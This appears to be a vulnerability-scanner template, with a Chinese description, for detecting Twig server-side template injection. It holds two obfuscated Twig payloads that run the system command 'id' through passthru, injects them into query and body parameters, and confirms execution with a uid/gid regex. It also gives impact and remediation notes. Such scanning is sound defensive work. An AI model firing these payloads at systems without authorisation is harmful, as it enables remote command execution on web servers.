id: twig-ssti

info:
  name: Twig 服务端模板注入（DAST）
  author: ritikchaddha
  severity: high
  description: |
    Twig 服务端模板注入发生在用户输入被当作模板语法执行时，攻击者可利用模板语言访问运行时对象或调用危险函数。模板注入 Twig 专用表达式，并通过 `id` 输出、`uid/gid` 正则或外带交互确认表达式在服务端执行。
  impact: |
    - 攻击者可能执行系统命令、读取敏感文件、访问应用上下文或窃取环境变量。
    - 模板引擎通常运行在 Web 应用权限下，成功利用可导致应用服务器失陷。
  remediation: |
    - 将用户输入作为普通数据绑定到模板变量，不允许用户控制模板源码或表达式。
    - 升级模板引擎，启用沙箱和最小权限运行环境，禁止危险类、函数和系统命令访问。
  reference:
    - https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
  metadata:
    max-request: 1
  tags: twig,ssti,dast,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
          - 'method == "POST"'
          - 'method == "PUT"'
    payloads:
      injection:
        - "{%block%20U%}id000passthru{%endblock%}{%set%20x=block(_charset%7Cfirst)%7Csplit(000)%}{{[x%7Cfirst]%7Cmap(x%7Clast)%7Cjoin}}"
        - "{{id~passthru~_context%7Cjoin%7Cslice(2,2)%7Csplit(000)%7Cmap(_context%7Cjoin%7Cslice(5,8))}}"

    fuzzing:
      - parts:
          - query
          - body
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    skip-variables-check: true
    matchers:
      - type: regex
        part: body
        regex:
          - "uid=[0-9]+.*gid=[0-9]+.*"
